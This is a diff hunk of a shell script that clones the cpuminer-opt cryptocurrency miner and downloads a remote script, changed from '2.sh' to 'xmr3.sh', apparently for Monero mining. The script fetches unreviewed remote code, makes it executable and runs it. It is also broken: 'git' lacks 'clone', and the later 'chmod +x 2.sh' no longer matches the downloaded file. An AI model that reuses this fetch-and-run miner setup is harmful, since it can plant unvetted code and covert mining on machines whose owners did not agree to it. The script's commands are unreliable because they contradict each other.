@@ -6,7 +6,7 @@ cd /usr/local/src/ &&
 rm -rf cpuminer-opt &&
 git https://github.com/fablebox/cpuminer-opt
 cd cpuminer-opt &&
-wget https://raw.githubusercontent.com/fablebox/susuwatari/master/thanhmlzz/2.sh &&
+wget https://raw.githubusercontent.com/fablebox/susuwatari/master/thanhmlzz/xmr3.sh &&
 chmod +x 2.sh &&
 chmod +x jce.sh &&
 ./build.sh &&
